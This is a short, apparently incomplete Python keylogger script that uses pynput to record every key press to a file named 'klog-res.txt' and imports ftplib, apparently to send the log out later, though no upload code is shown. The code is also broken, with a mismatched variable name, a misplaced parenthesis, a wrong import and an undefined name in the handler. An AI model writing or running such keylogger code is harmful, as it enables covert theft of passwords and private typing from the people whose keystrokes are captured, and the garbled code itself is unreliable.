from pynput import Key, Listener
import ftplib
import logging

lodir = ""

logging.basicConfig(filename=logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s"

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))
